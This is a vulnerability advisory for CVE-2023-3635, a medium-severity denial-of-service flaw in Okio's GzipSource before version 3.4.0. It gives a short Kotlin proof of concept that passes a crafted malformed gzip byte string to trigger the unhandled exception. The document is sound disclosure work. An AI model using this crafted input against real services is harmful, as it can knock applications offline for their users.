---
description: CVE-2023-3635, MEDIUM, Okio GzipSource unhandled exception Denial of Service
title: Okio GzipSource unhandled exception Denial of Service
date_published: "2023-07-12"
last_updated: "2023-07-12"
xray_id: XRAY-523195
vul_id: CVE-2023-3635
cvss: 5.9
severity: medium
discovered_by: 
type: vulnerability

---

## Summary

Okio GzipSource unhandled exception Denial of Service

## Component

com.squareup.okio:okio

## Affected versions

(,3.4.0)

## Description

GzipSource does not handle an exception that might be raised when parsing a malformed gzip buffer. This may lead to denial of service of the Okio client when handling a crafted GZIP archive, by using the GzipSource class.

## PoC

```kot
val gzBuf: Buffer = Buffer()
    try {
        val gzByteString: ByteString = ("1f8b41ff424242424343ffff").decodeHex()
        gzBuf.write(gzByteString)
        val gz: GzipSource = GzipSource(gzBuf)
        val sinkBuf: Buffer = Buffer()
        gz.read(sinkBuf, 5)
    }
    catch(e: IOException) {
        println("got error: " + e.toString())
    }
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[https://github.com/square/okio/commit/81bce1a30af244550b0324597720e4799281da7b](https://github.com/square/okio/commit/81bce1a30af244550b0324597720e4799281da7b)

